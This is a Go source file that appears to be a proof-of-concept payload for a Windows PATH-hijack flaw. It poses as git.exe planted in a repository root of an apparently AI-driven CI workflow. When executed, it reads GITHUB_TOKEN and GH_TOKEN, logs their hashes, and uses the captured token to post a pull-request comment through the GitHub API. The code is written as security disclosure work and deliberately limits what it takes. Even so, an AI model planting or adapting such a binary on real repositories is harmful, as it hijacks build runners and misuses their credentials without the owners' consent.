package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type proofComment struct {
	ID   int64 `json:"id"`
	User struct {
		Login string `json:"login"`
	} `json:"user"`
}

func tokenHash(value string) string {
	sum := sha256.Sum256([]byte(value))
	return hex.EncodeToString(sum[:])
}

func writeJSON(path string, value any) {
	data, err := json.MarshalIndent(value, "", "  ")
	if err != nil {
		panic(err)
	}
	data = append(data, '\n')
	if err := os.WriteFile(path, data, 0o600); err != nil {
		panic(err)
	}
}

func main() {
	cwd, _ := os.Getwd()
	if len(os.Args) == 2 && os.Args[1] == "--self-test" {
		writeJSON(filepath.Join(cwd, "git-self-test.log"), map[string]any{
			"payload_self_test": true,
			"cwd":               cwd,
		})
		return
	}

	githubToken := os.Getenv("GITHUB_TOKEN")
	ghToken := os.Getenv("GH_TOKEN")
	record := map[string]any{
		"event":                "repository-root-git-executed",
		"cwd":                  cwd,
		"args":                 os.Args[1:],
		"run_id":               os.Getenv("GITHUB_RUN_ID"),
		"github_token_present": githubToken != "",
		"gh_token_present":     ghToken != "",
		"github_token_sha256":  tokenHash(githubToken),
		"gh_token_sha256":      tokenHash(ghToken),
		"token_hashes_equal":   githubToken != "" && githubToken == ghToken,
		"NoDefaultCurrentDirectoryInExePath_value": os.Getenv("NoDefaultCurrentDirectoryInExePath"),
		"first_model_dispatch":                     "not_reached",
	}

	repository := os.Getenv("GITHUB_REPOSITORY")
	prNumber := os.Getenv("POC_PR_NUMBER")
	runID := os.Getenv("GITHUB_RUN_ID")
	if githubToken != "" && repository != "" && prNumber != "" && runID != "" {
		body := fmt.Sprintf(
			"[windows git plant PoC] repository-root git.exe executed before first model dispatch in run %s.",
			runID,
		)
		payload, _ := json.Marshal(map[string]string{"body": body})
		url := fmt.Sprintf(
			"https://api.github.com/repos/%s/issues/%s/comments",
			repository,
			prNumber,
		)
		request, err := http.NewRequest(
			http.MethodPost,
			url,
			bytes.NewReader(payload),
		)
		if err == nil {
			request.Header.Set("Accept", "application/vnd.github+json")
			request.Header.Set("Authorization", "Bearer "+githubToken)
			request.Header.Set("Content-Type", "application/json")
			request.Header.Set("User-Agent", "windows-git-path-falsifier")
			request.Header.Set("X-GitHub-Api-Version", "2022-11-28")
			client := &http.Client{Timeout: 20 * time.Second}
			response, requestErr := client.Do(request)
			if requestErr != nil {
				record["comment_error"] = requestErr.Error()
			} else {
				defer response.Body.Close()
				var comment proofComment
				if decodeErr := json.NewDecoder(response.Body).Decode(&comment); decodeErr != nil {
					record["comment_error"] = decodeErr.Error()
				} else {
					record["comment_id"] = comment.ID
					record["comment_author"] = comment.User.Login
				}
				record["comment_status"] = response.StatusCode
			}
		} else {
			record["comment_error"] = err.Error()
		}
	}

	writeJSON(filepath.Join(cwd, "planted-git.log"), record)
	fmt.Fprintln(os.Stderr, "bounded repository-root git.exe payload executed")
	if strings.EqualFold(os.Getenv("POC_PROXY_REAL_GIT"), "true") {
		return
	}
	os.Exit(73)
}
